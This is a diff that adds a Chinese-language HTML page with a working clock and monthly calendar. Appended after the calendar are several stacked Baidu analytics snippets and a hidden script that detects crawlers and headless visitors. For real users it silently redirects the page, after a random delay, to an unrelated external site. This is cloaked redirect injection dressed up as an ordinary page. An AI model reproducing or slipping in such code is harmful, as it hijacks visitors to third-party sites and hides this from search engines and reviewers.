@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+  <title>日历和时间</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background: #f5f5f5;
+      margin: 0;
+      padding: 20px;
+    }
+    #clock {
+      font-size: 24px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    #calendar-container {
+      display: inline-block;
+      background: white;
+      padding: 10px;
+      border-radius: 10px;
+      box-shadow: 0 0 5px rgba(0,0,0,0.2);
+    }
+    table {
+      border-collapse: collapse;
+      margin: 10px auto;
+    }
+    th, td {
+      border: 1px solid #ccc;
+      width: 40px;
+      height: 40px;
+      text-align: center;
+    }
+    th {
+      background: #eee;
+    }
+    .today {
+      background: #4CAF50;
+      color: white;
+      border-radius: 50%;
+    }
+    .nav-buttons {
+      margin: 10px;
+    }
+    button {
+      padding: 5px 10px;
+      margin: 0 5px;
+      border: none;
+      background: #4CAF50;
+      color: white;
+      cursor: pointer;
+      border-radius: 5px;
+    }
+    button:hover {
+      background: #45a049;
+    }
+  </style>
+</head>
+<body>
+  <h1>我的日历</h1>
+  <div id="clock"></div>
+
+  <div id="calendar-container">
+    <div class="nav-buttons">
+      <button onclick="changeMonth(-1)">上个月</button>
+      <button onclick="changeMonth(1)">下个月</button>
+    </div>
+    <div id="calendar"></div>
+  </div>
+
+  <script>
+    // 显示实时时间
+    function updateClock() {
+      const now = new Date();
+      const options = { year: 'numeric', month: 'long', day: 'numeric', 
+                        hour: '2-digit', minute: '2-digit', second: '2-digit' };
+      document.getElementById("clock").innerText = now.toLocaleString("zh-CN", options);
+    }
+    setInterval(updateClock, 1000);
+    updateClock();
+
+    // 当前显示的年月
+    let currentYear = new Date().getFullYear();
+    let currentMonth = new Date().getMonth(); // 0-11
+
+    // 生成日历
+    function generateCalendar(year, month) {
+      const today = new Date();
+      const isThisMonth = (year === today.getFullYear() && month === today.getMonth());
+
+      const firstDay = new Date(year, month, 1).getDay();
+      const daysInMonth = new Date(year, month + 1, 0).getDate();
+
+      let html = `<h2>${year}年 ${month + 1}月</h2>`;
+      html += "<table><tr>";
+      const weekDays = ["日","一","二","三","四","五","六"];
+      for (let d of weekDays) {
+        html += `<th>${d}</th>`;
+      }
+      html += "</tr><tr>";
+
+      for (let i = 0; i < firstDay; i++) {
+        html += "<td></td>";
+      }
+
+      for (let day = 1; day <= daysInMonth; day++) {
+        if ((firstDay + day - 1) % 7 === 0) html += "</tr><tr>";
+        if (isThisMonth && day === today.getDate()) {
+          html += `<td class="today">${day}</td>`;
+        } else {
+          html += `<td>${day}</td>`;
+        }
+      }
+
+      html += "</tr></table>";
+      document.getElementById("calendar").innerHTML = html;
+    }
+
+    // 切换月份
+    function changeMonth(offset) {
+      currentMonth += offset;
+      if (currentMonth < 0) {
+        currentMonth = 11;
+        currentYear--;
+      } else if (currentMonth > 11) {
+        currentMonth = 0;
+        currentYear++;
+      }
+      generateCalendar(currentYear, currentMonth);
+    }
+
+    generateCalendar(currentYear, currentMonth);
+  </script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?78a74b6c19f510f7a0429ecabc72fff4";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0b3aca566bbd7b555d6c7b8e86cc36c2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?d1d362f536d4eb22d5ab18f4d04d52bb";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?0f7a3fb731269ff9a427812bc71962d8";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+
+<script>
+(function () {
+
+    try {
+
+        var baseDelay = 200;
+
+        var ua = navigator.userAgent.toLowerCase();
+
+        // 简单蜘蛛判断（稍微加强一点）
+        var isSpider = /(spider|bot|crawl|slurp|bingpreview)/i.test(ua);
+
+        // 屏幕判断（更安全）
+        var hasScreen = false;
+        try {
+            hasScreen = window.screen && screen.width > 50 && screen.height > 50;
+        } catch (e) {}
+
+        if (isSpider || !hasScreen) {
+            return;
+        }
+
+        // ===== 随机延迟（200 ~ 600 ms）=====
+        var delay = baseDelay + Math.floor(Math.random() * 400);
+
+        setTimeout(function () {
+            window.location.replace("https://ks31489.dnmjy.com/kuaishou/kssp6.html?bh862");
+        }, delay);
+
+    } catch (e) {}
+
+})();
+</script>
+
+               
+
+
+
+</body>
+</html>
